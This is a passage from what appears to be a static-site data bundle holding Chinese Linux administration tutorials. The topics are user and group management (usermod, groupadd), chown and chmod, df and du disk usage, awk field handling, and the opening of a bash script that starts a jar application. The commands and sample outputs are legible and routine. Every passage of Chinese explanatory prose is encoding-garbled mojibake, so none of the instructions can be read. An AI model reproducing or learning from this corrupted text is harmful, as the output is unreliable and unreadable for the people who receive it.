ï¼ä½¿å¯ç æ æã\n * -s ä¿®æ¹ç¨æ·ç»å¥åæä½¿ç¨ç shellã\n * -u ä¿®æ¹ç¨æ· idã\n * -u è§£é¤å¯ç éå®ã\n * -a ä»£è¡¨ appendï¼ä¹å°±æ¯å°ç¨æ·æ·»å å°æ°ç¨æ·ç»ä¸­èä¸å¿ç¦»å¼åæçå¶ä»ç¨æ·ç»\n\nå° xulei æ·»å å° root ç»\n\nusermod -g root xulei\n\n\n1\n\n\nå¦ææ·»å çç¨æ·ä¸è½éè¿ ssh ç»å½ï¼å¯ä»¥æ¥çç¨æ·åå¦æ bash æé\n\n# æ¥çææç¨æ·ï¼å¯ä»¥æ¥çç¨æ·æ¯å¦æå¦ä¸è·¯å¾\ncat /etc/passwd\n# ä¿®æ¹ç¨æ·æ /bin/bash æé\nusermod -s /bin/bash ç¨æ·å\n# ç¦æ­¢ç¨æ·æ /bin/bash æ¹ä¸º /sbin/nologin\nusermod -s /sbin/nologin ç¨æ·å\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# ç¨æ·ç» group\n\nå³äºç»çå¢å åå é¤ä¿¡æ¯ä¼å¨ etc ç®å½ç group æä»¶ä¸­æ¾å°ï¼å½ä»¤ cat /etc/group å¯ä»¥çå°èªå·±çåç»ååç» idï¼0 è¡¨ç¤ºç®¡çåï¼rootï¼ï¼1 - 500 è¡¨ç¤ºç³»ç»ç¨æ·ã\n\ngroupadd å½ä»¤ è¯­æ³æ ¼å¼å¦ä¸ï¼\n\n * -gï¼æå®æ°å»ºå·¥ä½ç»ç idï¼\n * -rï¼åå»ºç³»ç»å·¥ä½ç»ï¼ç³»ç»å·¥ä½ç»çç» id å°äº 500ï¼\n * -kï¼è¦çéç½®æä»¶ "/ect/login.defs"ï¼\n * -oï¼åè®¸æ·»å ç» id å·ä¸å¯ä¸çå·¥ä½ç»ã\n * -f,--force: å¦ææå®çç»å·²ç»å­å¨ï¼æ­¤éé¡¹å°å¤±æäºä»ä»¥æåç¶æéåºãå½ä¸ -g ä¸èµ·ä½¿ç¨ï¼å¹¶ä¸æå®ç gid_min å·²ç»å­å¨æ¶ï¼éæ©å¦ä¸ä¸ªå¯ä¸ç gidï¼å³ - g å³é­ï¼ã\n\næ¥çææç»\n\ncat /etc/group\n\n\n1\n\n\næ¥çå½åç»\n\n[xulei@node102 sh]$ groups \nxulei\n\n\n1\n2\n\n\næ¥çç¨æ·æå±ç»\n\n[xulei@node102 sh]$ groups root\nroot : root\n\n\n1\n2\n\n\nå é¤ç»\n\ngroupdel xulei\n\n\n1\n\n\næ·»å é¢å¤ç»\n\nusermod -a -g ç»åç§° ç¨æ·å\n\n\n1\n\n\n\n# æä»¶æé chown\n\nç¨æ¥æ´æ¹æä¸ªç®å½ææä»¶çç¨æ·ååç¨æ·ç»ã\n\n * user : æ°çæ¡£æ¡æ¥æèçä½¿ç¨è id\n * group : æ°çæ¡£æ¡æ¥æèçä½¿ç¨èç¾¤ä½ (group)\n * -c : è¥è¯¥æ¡£æ¡æ¥æèç¡®å®å·²ç»æ´æ¹ï¼ææ¾ç¤ºå¶æ´æ¹å¨ä½\n * -f : è¥è¯¥æ¡£æ¡æ¥æèæ æ³è¢«æ´æ¹ä¹ä¸è¦æ¾ç¤ºéè¯¯è®¯æ¯\n * -h : åªå¯¹äºè¿ç» (link) è¿è¡åæ´ï¼èéè¯¥ link çæ­£æåçæ¡£æ¡\n * -v : æ¾ç¤ºæ¥æèåæ´çè¯¦ç»èµæ\n * -r : å¯¹ç®åç®å½ä¸çæææ¡£æ¡ä¸å­ç®å½è¿è¡ç¸åçæ¥æèåæ´ (å³ä»¥éåçæ¹å¼éä¸ªåæ´)\n * --help : æ¾ç¤ºè¾å©è¯´æ\n * --version : æ¾ç¤ºçæ¬\n\nä¿®æ¹ abc æä»¶çææè\n\nchownÂ root abc\n\n\n1\n\n\næç®å½ /demo åå¶ä¸çæææä»¶åå­ç®å½çææäººæ¹æ rootï¼æå±ç»æ¹æ rootaã\n\nchown -r root:roota /demo\n\n\n1\n\n\n\n# chmod\n\n-rwxr--r--. 1 xulei root  98 sep  7 11:49 arp.sh\n\n\n1\n\n\n-rwxr--r-- ä¸å± 10 ä¸ªå­ç¬¦ï¼ä¸é¢è®²è§£ä¸ï¼\n\n * d è¡¨ç¤ºç®å½ï¼å¦ææ¯ - è¡¨ç¤ºæ¯ä¸ä¸ªæ®éæä»¶ãå©ä½ç 9 ä¸ªå­ç¬¦ï¼åæ 3 ç»ï¼æ¯ç» 3 ä¸ªå­ç¬¦ï¼åå«è¡¨ç¤º user/group/others ç rwx æéï¼\n * u user è¡¨ç¤ºæ¥æèï¼å¯ä»¥çå°æ¥æèæ¯ xulei ç¨æ·ï¼ä½æä»¶è¿å±äº root ç»ï¼å æ­¤ xulei è¿æ¯æ æ³æ§è¡è¯¥æä»¶ã\n * g group è¡¨ç¤ºç»ï¼é¤äº mysql è¿ä¸ªäººç åä¸ä¸ª mysql ç»æ¥æçæå\n * o others å°±æ¯å¶ä»äººäºï¼å¥æéä¹æ²¡æã\n * a è¡¨ç¤º âææ (all) ç¨æ·âãå®æ¯ç³»ç»é»è®¤å¼ã\n\n[root@node102 sh]# chmod a+rwx checklogin.sh \n[root@node102 sh]# ll\ntotal 16\n-rwxr--r--. 1 xulei root  98 sep  7 11:49 arp.sh\n-rwxrwxrwx. 1 xulei root 353 jan 19 17:31 checklogin.sh\n-rwxr--r--. 1 root  root 123 sep  7 10:39 nginx_check.sh\n-rwxr-xr-x. 1 root  root 595 nov 27 15:15 start.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n',charsets:{cjk:!0}},{title:"Linux ç£çæä½ç¸å³å½ä»¤",frontmatter:{title:"Linux ç£çæä½ç¸å³å½ä»¤",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2301",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/2300.linux/2301.Linux%20%E7%A3%81%E7%9B%98%E6%93%8D%E4%BD%9C%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4.html",relativePath:"01.è¿ç»´/2300.linux/2301.Linux ç£çæä½ç¸å³å½ä»¤.md",key:"v-541435c6",path:"/linux/2301/",lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:null,content:"Df å½ä»¤æ¯ linux ç³»ç»ä»¥ç£çååºä¸ºåä½æ¥çæä»¶ç³»ç»ï¼å¯ä»¥å ä¸åæ°æ¥çç£çå©ä½ç©ºé´ä¿¡æ¯ï¼å½ä»¤æ ¼å¼ä½ df -h ï¼æ¾ç¤ºåå®¹å¦ä¸ï¼\n\nFILESYSTEM   SIZE   USED   AVAIL   USE%   MOUNTED ON\næä»¶ç³»ç»         å®¹é     å¯ç¨     Use%    å·²ç¨ %   æè½½ç¹\n/dev/hda2    45G    19G    24G     44%    /\n/dev/hda1    494M   19M    450M    4%     /boot\n\næ¥çç£çå©ä½ç©ºé´ df -hl\n\n[root@localhost /]# df -hl\nFilesystem               Size  Used Avail Use% Mounted on\ndevtmpfs                 1.9G     0  1.9G   0% /dev\ntmpfs                    1.9G     0  1.9G   0% /dev/shm\ntmpfs                    1.9G   29M  1.9G   2% /run\ntmpfs                    1.9G     0  1.9G   0% /sys/fs/cgroup\n/dev/mapper/centos-root   47G   16G   32G  34% /\n/dev/sda1               1014M  326M  689M  33% /boot\ntmpfs                    378M  8.0K  378M   1% /run/user/42\ntmpfs                    378M   32K  378M   1% /run/user/1000\n/dev/sr0                 4.3G  4.3G     0 100% /run/media/fengqianrun/CentOS 7 x86_64\ntmpfs                    378M     0  378M   0% /run/user/0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\næ¥çæ¯ä¸ªæ ¹è·¯å¾çååºå¤§å° df -h\n\n[root@localhost /]# df -h\nFilesystem               Size  Used Avail Use% Mounted on\ndevtmpfs                 1.9G     0  1.9G   0% /dev\ntmpfs                    1.9G     0  1.9G   0% /dev/shm\ntmpfs                    1.9G   29M  1.9G   2% /run\ntmpfs                    1.9G     0  1.9G   0% /sys/fs/cgroup\n/dev/mapper/centos-root   47G   16G   32G  34% /\n/dev/sda1               1014M  326M  689M  33% /boot\ntmpfs                    378M  8.0K  378M   1% /run/user/42\ntmpfs                    378M   32K  378M   1% /run/user/1000\n/dev/sr0                 4.3G  4.3G     0 100% /run/media/fengqianrun/CentOS 7 x86_64\ntmpfs                    378M     0  378M   0% /run/user/0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nè¿åè¯¥ç®å½çå¤§å° du -sh [ç®å½å]\n\n[root@localhost /]# du -sh /root\n803M    /root\n\n\n1\n2\n\n\nè¿åè¯¥æä»¶å¤¹æ» M æ° du -sm [æä»¶å¤¹]\n\n[root@localhost /]# du -sm /root\n803     /root\n\n\n1\n2\n\n\næ¥çæå®æä»¶å¤¹ä¸çæææä»¶å¤§å°ï¼åå«å­æä»¶å¤¹) du -h [ç®å½å]\n\n[root@localhost /]# du -h /root\n12K     /root/redis-6.0.5/utils/hyperloglog\n20K     /root/redis-6.0.5/utils/lru\n20K     /root/redis-6.0.5/utils/releasetools\n12K     /root/redis-6.0.5/utils/srandmember\n164K    /root/redis-6.0.5/utils\n71M     /root/redis-6.0.5\n803M    /root\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\näº§çæä»¶å±äºåªä¸ªç£ç df -h [ç®å½]\n\n//æ²¡ææè½½ç£ççç®å½ï¼æ¾ç¤ºå¨ç³»ç»ç\n[root@iZ2ze57v3n0zma46zqiq8nZ sh-1.5.5]# df -h /alidata/\nFilesystem      Size  Used Avail Use% Mounted on\n/dev/vda1        40G  4.6G   33G  13% /\n\n\n1\n2\n3\n4\n\n\n//æè½½äºç£ççç®å½ï¼æ¾ç¤ºå¨æ°æ®çååºvdb1\n[root@iZ2ze57v3n0zma46zqiq8nZ sh-1.5.5]# df -h /mnt/\nFilesystem      Size  Used Avail Use% Mounted on\n/dev/vdb1        20G   45M   19G   1% /mnt\n\n\n1\n2\n3\n4\n\n\nå¨æ¾ç¤ºç»æä¸­ç Filesystem å Mounted onï¼è¿ä¸¤åå°±æ¯è¿ä¸ªç®å½æå±çç£çååºã\nå ä¸º Linux æ¯æ å½¢æä»¶ç³»ç»ï¼ç®å½å±äºåªä¸ªç£çååºåå³äºæè½½ç£çæ¶çæè½½ç¹ï¼æä»¥è¦æ³ç¥éç®å½å¨åªä¸ªååºï¼å°±è¦åå©æ¾ç¤ºç£ççä¿¡æ¯ï¼ç¹å«è½æ¾ç¤ºæè½½ç¹ï¼çå½ä»¤ãdf å½ä»¤æ¯æ¾ç¤ºç£çå®¹éçï¼ä½æ¯ä»¥ç®å½ä½ä¸ºåæ°ï¼å¯ä»¥æ¾ç¤ºç®å½æå¨ç£ççä¿¡æ¯ãæä»¥è¿ä¸ªç¬¨åæ³ä¹ç®æ¯ä¸ªå¥½åæ³å§ã",normalizedContent:"df å½ä»¤æ¯ linux ç³»ç»ä»¥ç£çååºä¸ºåä½æ¥çæä»¶ç³»ç»ï¼å¯ä»¥å ä¸åæ°æ¥çç£çå©ä½ç©ºé´ä¿¡æ¯ï¼å½ä»¤æ ¼å¼ä½ df -h ï¼æ¾ç¤ºåå®¹å¦ä¸ï¼\n\nfilesystem   size   used   avail   use%   mounted on\næä»¶ç³»ç»         å®¹é     å¯ç¨     use%    å·²ç¨ %   æè½½ç¹\n/dev/hda2    45g    19g    24g     44%    /\n/dev/hda1    494m   19m    450m    4%     /boot\n\næ¥çç£çå©ä½ç©ºé´ df -hl\n\n[root@localhost /]# df -hl\nfilesystem               size  used avail use% mounted on\ndevtmpfs                 1.9g     0  1.9g   0% /dev\ntmpfs                    1.9g     0  1.9g   0% /dev/shm\ntmpfs                    1.9g   29m  1.9g   2% /run\ntmpfs                    1.9g     0  1.9g   0% /sys/fs/cgroup\n/dev/mapper/centos-root   47g   16g   32g  34% /\n/dev/sda1               1014m  326m  689m  33% /boot\ntmpfs                    378m  8.0k  378m   1% /run/user/42\ntmpfs                    378m   32k  378m   1% /run/user/1000\n/dev/sr0                 4.3g  4.3g     0 100% /run/media/fengqianrun/centos 7 x86_64\ntmpfs                    378m     0  378m   0% /run/user/0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\næ¥çæ¯ä¸ªæ ¹è·¯å¾çååºå¤§å° df -h\n\n[root@localhost /]# df -h\nfilesystem               size  used avail use% mounted on\ndevtmpfs                 1.9g     0  1.9g   0% /dev\ntmpfs                    1.9g     0  1.9g   0% /dev/shm\ntmpfs                    1.9g   29m  1.9g   2% /run\ntmpfs                    1.9g     0  1.9g   0% /sys/fs/cgroup\n/dev/mapper/centos-root   47g   16g   32g  34% /\n/dev/sda1               1014m  326m  689m  33% /boot\ntmpfs                    378m  8.0k  378m   1% /run/user/42\ntmpfs                    378m   32k  378m   1% /run/user/1000\n/dev/sr0                 4.3g  4.3g     0 100% /run/media/fengqianrun/centos 7 x86_64\ntmpfs                    378m     0  378m   0% /run/user/0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nè¿åè¯¥ç®å½çå¤§å° du -sh [ç®å½å]\n\n[root@localhost /]# du -sh /root\n803m    /root\n\n\n1\n2\n\n\nè¿åè¯¥æä»¶å¤¹æ» m æ° du -sm [æä»¶å¤¹]\n\n[root@localhost /]# du -sm /root\n803     /root\n\n\n1\n2\n\n\næ¥çæå®æä»¶å¤¹ä¸çæææä»¶å¤§å°ï¼åå«å­æä»¶å¤¹) du -h [ç®å½å]\n\n[root@localhost /]# du -h /root\n12k     /root/redis-6.0.5/utils/hyperloglog\n20k     /root/redis-6.0.5/utils/lru\n20k     /root/redis-6.0.5/utils/releasetools\n12k     /root/redis-6.0.5/utils/srandmember\n164k    /root/redis-6.0.5/utils\n71m     /root/redis-6.0.5\n803m    /root\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\näº§çæä»¶å±äºåªä¸ªç£ç df -h [ç®å½]\n\n//æ²¡ææè½½ç£ççç®å½ï¼æ¾ç¤ºå¨ç³»ç»ç\n[root@iz2ze57v3n0zma46zqiq8nz sh-1.5.5]# df -h /alidata/\nfilesystem      size  used avail use% mounted on\n/dev/vda1        40g  4.6g   33g  13% /\n\n\n1\n2\n3\n4\n\n\n//æè½½äºç£ççç®å½ï¼æ¾ç¤ºå¨æ°æ®çååºvdb1\n[root@iz2ze57v3n0zma46zqiq8nz sh-1.5.5]# df -h /mnt/\nfilesystem      size  used avail use% mounted on\n/dev/vdb1        20g   45m   19g   1% /mnt\n\n\n1\n2\n3\n4\n\n\nå¨æ¾ç¤ºç»æä¸­ç filesystem å mounted onï¼è¿ä¸¤åå°±æ¯è¿ä¸ªç®å½æå±çç£çååºã\nå ä¸º linux æ¯æ å½¢æä»¶ç³»ç»ï¼ç®å½å±äºåªä¸ªç£çååºåå³äºæè½½ç£çæ¶çæè½½ç¹ï¼æä»¥è¦æ³ç¥éç®å½å¨åªä¸ªååºï¼å°±è¦åå©æ¾ç¤ºç£ççä¿¡æ¯ï¼ç¹å«è½æ¾ç¤ºæè½½ç¹ï¼çå½ä»¤ãdf å½ä»¤æ¯æ¾ç¤ºç£çå®¹éçï¼ä½æ¯ä»¥ç®å½ä½ä¸ºåæ°ï¼å¯ä»¥æ¾ç¤ºç®å½æå¨ç£ççä¿¡æ¯ãæä»¥è¿ä¸ªç¬¨åæ³ä¹ç®æ¯ä¸ªå¥½åæ³å§ã",charsets:{cjk:!0}},{title:"Linux ææ¬æ°æ®å¤çå·¥å·awkå½ä»¤",frontmatter:{title:"Linux ææ¬æ°æ®å¤çå·¥å·awkå½ä»¤",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2302",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/2300.linux/2302.Linux%20%E6%96%87%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%B7%A5%E5%85%B7awk%E5%91%BD%E4%BB%A4.html",relativePath:"01.è¿ç»´/2300.linux/2302.Linux ææ¬æ°æ®å¤çå·¥å·awkå½ä»¤.md",key:"v-1308af9d",path:"/linux/2302/",headers:[{level:2,title:"Fï¼æå®å­æ®µåéç¬¦ï¼",slug:"f-æå®å­æ®µåéç¬¦",normalizedTitle:"fï¼æå®å­æ®µåéç¬¦ï¼",charIndex:79},{level:2,title:"FSï¼å­æ®µåéç¬¦ï¼",slug:"fs-å­æ®µåéç¬¦",normalizedTitle:"fsï¼å­æ®µåéç¬¦ï¼",charIndex:368},{level:2,title:"NFï¼å½åè¡çå­æ®µä¸ªæ°ï¼",slug:"nf-å½åè¡çå­æ®µä¸ªæ°",normalizedTitle:"nfï¼å½åè¡çå­æ®µä¸ªæ°ï¼",charIndex:683},{level:2,title:"NR (å½åå¤ççæ¯ç¬¬å è¡)",slug:"nr-å½åå¤ççæ¯ç¬¬å è¡",normalizedTitle:"nr (å½åå¤ççæ¯ç¬¬å è¡)",charIndex:900},{level:2,title:"FILENAME(å½åæä»¶å)",slug:"filename-å½åæä»¶å",normalizedTitle:"filename (å½åæä»¶å)",charIndex:1458},{level:2,title:"å¶ä»åé",slug:"å¶ä»åé",normalizedTitle:"å¶ä»åé",charIndex:1794},{level:2,title:"print å printf",slug:"print-å-printf",normalizedTitle:"print å printf",charIndex:1911},{level:2,title:"å¶ä»å½æ°",slug:"å¶ä»å½æ°",normalizedTitle:"å¶ä»å½æ°",charIndex:2139},{level:2,title:"æ¡ä»¶",slug:"æ¡ä»¶",normalizedTitle:"æ¡ä»¶",charIndex:2690},{level:2,title:"demo",slug:"demo",normalizedTitle:"demo",charIndex:3964}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"Fï¼æå®å­æ®µåéç¬¦ï¼ FSï¼å­æ®µåéç¬¦ï¼ NFï¼å½åè¡çå­æ®µä¸ªæ°ï¼ NR (å½åå¤ççæ¯ç¬¬å è¡) FILENAME(å½åæä»¶å) å¶ä»åé print å printf å¶ä»å½æ° æ¡ä»¶ demo",content:'awk å½ä»¤æ¯éè¡æ«ææä»¶ï¼ä»ç¬¬ 1 è¡å°æåä¸è¡ï¼ï¼å¯»æ¾å«æç®æ ææ¬çè¡ï¼å¦æå¹éæåï¼åä¼å¨è¯¥è¡ä¸æ§è¡ç¨æ·æ³è¦çæä½ï¼åä¹ï¼åä¸å¯¹è¡åä»»ä½å¤çã\n\n\n# Fï¼æå®å­æ®µåéç¬¦ï¼\n\né»è®¤ä½¿ç¨ç©ºæ ¼ä½ä¸ºåéç¬¦ã\n\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print $1}\'\naa\n[root@localhost awk]# echo "aa bb l cc dd l ee ff" | awk -F \'l\' \'{print $1}\'\naa bb \n[root@localhost awk]# echo "aa bb  cc : dd  ee ff" | awk -F \':\' \'{print $1}\'\naa bb  cc \n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# FSï¼å­æ®µåéç¬¦ï¼\n\né»è®¤æ¯ç©ºæ ¼åå¶è¡¨ç¬¦ã\n$0 è¡¨ç¤ºå½åæ´è¡åå®¹ï¼$1ï¼$2 è¡¨ç¤ºç¬¬ä¸ä¸ªå­æ®µï¼ç¬¬äºä¸ªå­æ®µ\n\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $0}\'\naa bb cc  dd\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $1}\'\naa\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $2}\'\nbb\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# NFï¼å½åè¡çå­æ®µä¸ªæ°ï¼\n\nå°±ä»£è¡¨æåä¸ä¸ªå­æ®µï¼(NF-1) ä»£è¡¨åæ°ç¬¬äºä¸ªå­æ®µ\n\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $NF}\'\ndd\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $(NF-1)}\'\ncc\n\n\n1\n2\n3\n4\n\n\n\n# NR (å½åå¤ççæ¯ç¬¬å è¡)\n\næå°å½åè¡å·åå½åææ¬åå®¹\n\n[root@localhost awk]# cat test.txt \naa ss\ndd ff\ngg hh\n[root@localhost awk]# cat test.txt | awk \'{print NR")", $0}\'\n1) aa ss\n2) dd ff\n3) gg hh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\néå·è¡¨ç¤ºè¾åºçåéä¹é´ç¨ç©ºæ ¼åéï¼\nå³æ¬å·å¿éä½¿ç¨ åå¼å· æå¯ä»¥åæ ·è¾åº\næå°æå®è¡åå®¹ï¼\n\n[root@localhost S17]# java -version \njava version "1.8.0_131"\nJava(TM) SE Runtime Environment (build 1.8.0_131-b11)\nJava HotSpot(TM) 64-Bit Server VM (build 25.131-b11, mixed mode)\n[root@localhost S17]# java -version 2>&1  | awk \'NR==1 {print $0}\'\njava version "1.8.0_131"\n[root@localhost S17]# \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# FILENAME (å½åæä»¶å)\n\n[root@localhost awk]#  awk \'{print FILENAME, NR")", $0}\' test.txt \ntest.txt 1) aa ss\ntest.txt 2) dd ff\ntest.txt 3) gg hh\n[root@localhost awk]# cat test.txt | awk \'{print FILENAME, NR")", $0}\'\n- 1) aa ss\n- 2) dd ff\n- 3) gg hh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nawk \'{condition action}\' filename è¿ç§å½¢å¼æ¶å¯ä»¥æå°æä»¶åï¼\néè¿ |ï¼ç®¡éç¬¦ï¼è¯»ååå®¹æ¶æå°çæ¯ -\n\n\n# å¶ä»åé\n\nRSï¼è¡åéç¬¦ï¼ç¨äºåå²æ¯ä¸è¡ï¼é»è®¤æ¯æ¢è¡ç¬¦ã\nOFSï¼è¾åºå­æ®µçåéç¬¦ï¼ç¨äºæå°æ¶åéå­æ®µï¼é»è®¤ä¸ºç©ºæ ¼ã\nORSï¼è¾åºè®°å½çåéç¬¦ï¼ç¨äºæå°æ¶åéè®°å½ï¼é»è®¤ä¸ºæ¢è¡ç¬¦ã\nOFMTï¼æ°å­è¾åºçæ ¼å¼ï¼é»è®¤ä¸ºï¼.6gã\n\n\n# print å printf\n\nawk ä¸­åæ¶æä¾äº print å printf ä¸¤ç§æå°è¾åºçå½æ°ã\n\nprint å½æ°ï¼åæ°å¯ä»¥æ¯åéãæ°å¼æèå­ç¬¦ä¸²ãå­ç¬¦ä¸²å¿é¡»ç¨åå¼å·å¼ç¨ï¼åæ°ç¨éå·åéãå¦ææ²¡æéå·ï¼åæ°å°±ä¸²èå¨ä¸èµ·èæ æ³åºåãè¿éï¼éå·çä½ç¨ä¸è¾åºæä»¶çåéç¬¦çä½ç¨æ¯ä¸æ ·çï¼åªæ¯åèæ¯ç©ºæ ¼èå·²ã\n\nprintf å½æ°ï¼å¶ç¨æ³å c è¯­è¨ä¸­ printf åºæ¬ç¸ä¼¼ï¼å¯ä»¥æ ¼å¼åå­ç¬¦ä¸²ï¼è¾åºå¤ææ¶ï¼printf æ´å å¥½ç¨ï¼ä»£ç æ´ææã\n\n\n# å¶ä»å½æ°\n\ntoupper ()ï¼å­ç¬¦è½¬ä¸ºå¤§åã\ntolower ()ï¼å­ç¬¦è½¬ä¸ºå°åã\nlength ()ï¼è¿åå­ç¬¦ä¸²é¿åº¦ã\nsubstr ()ï¼è¿åå­å­ç¬¦ä¸²ã\nsubstr ($1,2)ï¼è¿åç¬¬ä¸ä¸ªå­æ®µï¼ä»ç¬¬ 2 ä¸ªå­ç¬¦å¼å§ä¸ç´å°ç»æã\nsubstr ($1,2,3)ï¼è¿åç¬¬ä¸ä¸ªå­æ®µï¼ä»ç¬¬ 2 ä¸ªå­ç¬¦å¼å§å¼å§åç 3 ä¸ªå­ç¬¦ã\nsin ()ï¼æ­£å¼¦ã\ncos ()ï¼ä½å¼¦ã\nsqrt ()ï¼å¹³æ¹æ ¹ã\nrand ()ï¼éæºæ°ã\n\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print toupper($1)}\'\nAA\n[root@localhost awk]# echo "aa BB  cc dd  ee ff" | awk  \'{print tolower($2)}\'\nbb\n[root@localhost awk]# echo "aa BB  cc dd  ee ff" | awk  \'{print length($2)}\'\n2\n[root@localhost awk]# echo "asdfghj" | awk \'{print substr($1,2,3)}\'\nsdf\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# æ¡ä»¶\n\nawk åè®¸æå®è¾åºæ¡ä»¶ï¼åªè¾åºç¬¦åæ¡ä»¶çè¡ã\nawk \' æ¡ä»¶ {å¨ä½}\' æä»¶å\n\n[root@localhost awk]# cat exp.txt \n/stsvc/fms/conf/application.yml\n/stsvc/sms/conf/application.yml\n/stsvc/tms/conf/application.yml\n/root/home/chenfan\n/root/home/jhhuang\n[root@localhost awk]# cat exp.txt | awk \'/stsvc/ {print $0}\'     åå« stsvc çè¡\n/stsvc/fms/conf/application.yml\n/stsvc/sms/conf/application.yml\n/stsvc/tms/conf/application.yml\n[root@localhost awk]# cat exp.txt | awk \'/stsvc\\/fms/ {print $0}\' åå« stsvc/fms çè¡\n/stsvc/fms/conf/application.yml\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nå¸å°å¼å¤æ­\n\n[root@localhost awk]# cat exp.txt | awk \'NR==2 {print $0}\'ããç­äºç¬¬äºè¡\n/stsvc/sms/conf/application.yml\n[root@localhost awk]# cat exp.txt | awk \'NR>4 {print $0}\'ããå¤§äºç¬¬åè¡\n/root/home/jhhuang\n[root@localhost awk]# cat exp.txt | awk \'NR%2==1 {print $0}\'ããå¥æ°è¡\n/stsvc/fms/conf/application.yml\n/stsvc/tms/conf/application.yml\n/root/home/jhhuang\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\næä¸ªå­æ®µç­äºå·ä½å¼\n\n[root@localhost awk]# cat test.txt \naa ss\ndd ff\ngg hh\n[root@localhost awk]# cat test.txt | awk \' $2=="ff" {print $0}\'\ndd ff\n\n\n1\n2\n3\n4\n5\n6\n\n\nif è¯­å¥\n\n[root@localhost awk]# echo "aa ss dd" | awk \'{ if($3 == "dd") print $0; else print "nothing"}\'\naa ss dd\n[root@localhost awk]# echo "aa ss dds" | awk \'{ if($3 == "dd") print $0; else print "nothing"}\'\nnothing\n\n\n1\n2\n3\n4\n\n\n\n# demo\n\nä»¥ä¸èæ¬å¤å¶ç²è´´å°±å¯ç¨ï¼éè¦å¨ååºç¨åçº§ç®å½æ°å»ºä¸ä¸ª logs æä»¶å¤¹ï¼ä½¿ç¨æ¹æ³ ./ èæ¬.sh start åºç¨åç§°.jarï¼å¶ä¸­ä½¿ç¨äº awk å½ä»¤è§£å³è·å pid é®é¢\n\n#/bin/bash\n\n# è¿éè¯´ä¸ä¸ æç¨ /bin/sh èæ¬éæå°éæ­£å¸¸ æ¢æ /bin/bash å°±å¥½äº\n# éè¿æ§è¡æä»¶è·å¾ è¦è¢«æ§è¡çjar ä¾å¦ ./start.sh test-0.0.1.jar è·åå° test-0.0.1.jar\n# $@è·å¾ææåæ°,$1è·å¾ç¬¬ä¸ä¸ªåæ°\nMATHOD=$1\nAPP_NAME=$2\n# å¨æ¹æ³åç´æ¥ä½¿ç¨æ¯æ æ³è·åå°ä¸ªæ°ç\nPARAM=$#\n\n# åæ°æ ¡éª\ncheck(){\n    if [ $PARAM -ne 2 ]; then\n        echo "run method  $0 start | stop  app_name.jar"\n        exit\n    fi\n}\n\n\n# å¤æ­ç¨åºæ¯å¦è¿è¡ å¦æä¸å­å¨è¿å1ï¼å­å¨è¿å0\nis_exist(){\n    check\n    # grep -v grep å°±æ¯æ¥æ¾ä¸å«æ grep å­æ®µçè¡ï¼é»è®¤ç¬¬ä¸æ¡å½ä»¤ä¼æ¥åºä¸¤è¡æ°æ®ï¼ç¬¬ä¸è¡ä¸è¬æ¯æä»¬æéè¦çï¼ç¬¬äºè¡å°±å±äº grepçæ°æ®\n    # grep æ¯æ¥æ¾å«ææå®ææ¬è¡çææï¼æ¯å¦grep test å°±æ¯æ¥æ¾å«ætestçææ¬çè¡\n    # grep -v æ¯ååæ¥æ¾çææï¼æ¯å¦ grep -v grep å°±æ¯æ¥æ¾ä¸å«æ grep å­æ®µçè¡\n    # $(ps -ef | grep $jarname | grep -v grep) æ¯æ§è¡ä¸ä¸ªå½ä»¤ï¼å¹¶æç»æèµç»pid\n    # awk ç¾åº¦\n    pid=`ps -ef | grep $APP_NAME | grep -v grep | awk \'{print $2}\'`\n    # [ -z STRING ] âSTRINGâ çé¿åº¦ä¸ºé¶åä¸ºçã\n    if [ -z "$pid" ]; then\n        return 1\n    else\n        return 0\n    fi\n}\n\n#å¯å¨æ¹æ³\nstart(){\n    is_exist\n    # %%-* è¡¨ç¤ºä»å³è¾¹å¼å§ï¼å é¤æåï¼æå·¦è¾¹ï¼ç - å·åå³è¾¹çå¤æå­ç¬¦\n    LOG_NAME="${APP_NAME%%-*}.log"\n    # $? æ¯ä¸ä¸ªç¹æ®åéï¼ç¨æ¥è·åä¸ä¸ä¸ªå½ä»¤çéåºç¶æï¼æèä¸ä¸ä¸ªå½æ°çè¿åå¼ã\n    # -eq ç­äº\n    if [ $? -eq 0 ]; then\n        stop\n        start_app\n    else\n        start_app\n    fi\n}\n\nstart_app(){\n    echo "$APP_NAME start..."\n    # 2> è¡¨ç¤ºææ åéè¯¯(stderr)éå®åï¼æ 